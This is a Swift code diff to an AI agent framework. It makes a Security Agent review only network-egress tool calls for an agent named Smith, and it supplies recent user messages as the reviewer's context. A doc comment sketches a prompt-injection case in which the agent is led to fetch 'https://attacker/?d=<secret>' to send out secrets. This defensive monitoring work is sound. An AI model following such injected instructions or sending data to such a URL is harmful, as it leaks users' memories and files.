@@ -46,6 +46,12 @@ public actor AgentActor {
     /// Whether the per-tool-call security evaluation (Security Agent SAFE/WARN/UNSAFE/ABORT) is active. When
     /// false, Brown's approved tools execute without per-call review. Live-toggleable from Settings.
     private var perCallApprovalEnabled = true
+    /// When true (Smith), the Security Agent gates ONLY open-world (network-egress) tool calls —
+    /// `web_fetch` / `web_search` / `instant_answer` — while local read-only and messaging tools run
+    /// un-reviewed. This is the egress filter: Smith is unscoped and holds the user's memories and
+    /// file-read, so an injected instruction to fetch `https://attacker/?d=<secret>` would otherwise
+    /// be an unreviewed exfiltration channel. Brown instead reviews ALL tools via `requiresToolApproval`.
+    private var evaluatesOpenWorldToolsOnly = false
     /// Fired when the approved tool set changes (initial scope already happened in the runtime;
     /// this is for mid-task re-scopes) so the runtime can persist it on the task as a record.
     private var onApprovedToolsChanged: (@Sendable (Set<String>) async -> Void)?
@@ -527,6 +533,40 @@ public actor AgentActor {
     /// Toggles the per-tool-call security evaluation live (false ⇒ approved tools run un-reviewed).
     public func setPerCallApprovalEnabled(_ enabled: Bool) {
         perCallApprovalEnabled = enabled
+    }
+
+    /// Enables the egress filter: only open-world (network) tool calls are routed through the
+    /// Security Agent; everything else runs un-reviewed. Set for Smith. Requires a SecurityEvaluator
+    /// to have any effect.
+    public func setEvaluatesOpenWorldToolsOnly(_ enabled: Bool) {
+        evaluatesOpenWorldToolsOnly = enabled
+    }
+
+    /// Whether this tool call must be evaluated by the Security Agent before it runs.
+    /// Brown reviews every tool (`requiresToolApproval`); Smith reviews only open-world tools
+    /// (`evaluatesOpenWorldToolsOnly`). Either way it's a no-op without a configured evaluator or
+    /// when per-call review is switched off.
+    private func mustEvaluate(_ tool: any AgentTool) -> Bool {
+        guard perCallApprovalEnabled, securityEvaluator != nil else { return false }
+        if configuration.requiresToolApproval { return true }
+        return evaluatesOpenWorldToolsOnly && tool.isOpenWorld
+    }
+
+    /// The last few user-role messages, concatenated, for the Security Agent's context when this
+    /// agent has no task to describe (Smith). The motivating request may be many turns back — a
+    /// delayed "create a task to do X when the current one finishes" — so a window is passed, not
+    /// just the latest. System-injected nudges are skipped so the model sees real user intent.
+    private func recentUserMessagesForEvaluation(limit: Int = 4) -> String? {
+        var texts: [String] = []
+        for msg in conversationHistory.reversed() where msg.role == .user {
+            guard case .text(let text) = msg.content else { continue }
+            let trimmed = text.trimmingCharacters(in: .whitespacesAndNewlines)
+            if trimmed.isEmpty || trimmed.hasPrefix("[System") || trimmed.hasPrefix("Continue.") { continue }
+            texts.append(trimmed)
+            if texts.count >= limit { break }
+        }
+        guard !texts.isEmpty else { return nil }
+        return texts.reversed().joined(separator: "\n---\n")
     }
 
     /// Applies the global tool policy, then per-task user overrides, on top of a base approved set.
@@ -2032,7 +2072,7 @@ public actor AgentActor {
                     if let tool = activeTools.first(where: { $0.name == call.name }) {
                         if let rejection = await rejectionResultIfUnavailable(call, tool: tool) {
                             result = rejection
-                        } else if configuration.requiresToolApproval && perCallApprovalEnabled {
+                        } else if mustEvaluate(tool) {
                             let siblings = segment.calls.count > 1
                                 ? approvalSummaries.enumerated().compactMap { $0.offset != batchIndex ? $0.element : nil }
                                 : []
@@ -2218,6 +2258,9 @@ public actor AgentActor {
         }
 
         let siblings = siblingCallSummaries.isEmpty ? nil : siblingCallSummaries.joined(separator: "\n")
+        // With no task to describe (Smith's egress calls), give the Security Agent the recent user
+        // request(s) as the justification context instead — that is what the call must be consistent with.
+        let agentContext = currentTask == nil ? recentUserMessagesForEvaluation() : nil
         toolContext.onSecurityAgentProcessingStateChange(true)
         let disposition = await evaluator.evaluate(
             toolName: call.name,
@@ -2229,6 +2272,7 @@ public actor AgentActor {
             taskDescription: currentTask?.description,
             siblingCalls: siblings,
             agentRoleName: configuration.role.displayName,
+            agentContext: agentContext,
             toolCallID: call.id
         )
         toolContext.onSecurityAgentProcessingStateChange(false)
